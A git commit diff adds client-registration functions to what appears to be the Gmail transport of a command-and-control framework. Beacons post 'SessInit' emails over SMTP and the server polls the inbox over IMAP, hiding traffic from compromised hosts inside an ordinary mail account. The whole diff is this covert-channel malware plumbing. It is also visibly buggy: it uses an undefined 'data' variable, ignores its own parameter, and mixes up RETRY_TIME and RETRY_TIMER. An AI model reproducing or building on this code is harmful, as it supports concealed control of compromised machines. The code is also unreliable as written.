fb67edcd568809899f7dd67e261da16da5d9e02a
Und3rf10w <jrec93@gmail.com>
2018-06-10 19:28:53 -0400

    updated transport_gmail to have new client init functions

--- skeletons/transports/gmail/transport_gmail.py
+++ skeletons/transports/gmail/transport_gmail.py
@@ -18,6 +18,34 @@ RETRY_TIMER = int(```[var:::retry_time]```)
 def prepTransport():
 	return 0
 
+def send_server_notification(notification_data_frame):
+	msg = MIMEMultipart()
+	msg['From'] = GMAIL_USER
+	msg['To'] = GMAIL_USER
+	msg['Subject'] = "SessInit"
+	message_content = data
+
+	msg.attach(MIMEText(str(message_content)))
+
+	while True:
+		try:
+			# mailServer = SMTP(SERVER, SERVER_PORT)
+			mailServer = SMTP_SSL(SERVER, SERVER_PORT)
+			# mailServer.connect(SERVER, SERVER_PORT)
+			# mailServer.ehlo()
+			# mailServer.starttls()
+			# mailServer.usetls()
+			print "started tls"
+			print mailServer.login(GMAIL_USER, GMAIL_PWD)
+			print "logged in"
+			mailServer.sendmail(GMAIL_USER, GMAIL_USER, msg.as_string())
+			print "sent " + str(len(msg.as_string())) + " bytes"
+			mailServer.quit()
+			break
+		except Exception as e:
+			print e
+			sleep(RETRY_TIME)  # wait RETRY_TIME seconds to try again
+
 def sendData(beacon_id, data):
 	msg = MIMEMultipart()
 	msg['From'] = GMAIL_USER
@@ -46,6 +74,25 @@ def sendData(beacon_id, data):
 		except Exception as e:
 			print e
 			sleep(RETRY_TIME) # wait RETRY_TIME seconds to try again
+
+
+def check_for_new_clients():
+	c = imaplib.IMAP4_SSL(SERVER)
+	c.login(GMAIL_USER, GMAIL_PWD)
+	c.select("INBOX")
+
+	typ, id_list = c.search(None, '(UNSEEN SUBJECT "SessInit")')
+	print id_list[0].split()
+	if not id_list[0].split():
+		return None
+	else:
+		for msg_id in id_list[0].split():
+			msg = c.fetch(msg_id, '(RFC822)')
+			msg = ([x[0] for x in msg][1])[1]
+			for part in email.message_from_string(msg).walk():
+				msg = part.get_payload()
+				c.logout()
+			return msg
 
 def retrieveData(beacon_id):
 	c= imaplib.IMAP4_SSL(SERVER)
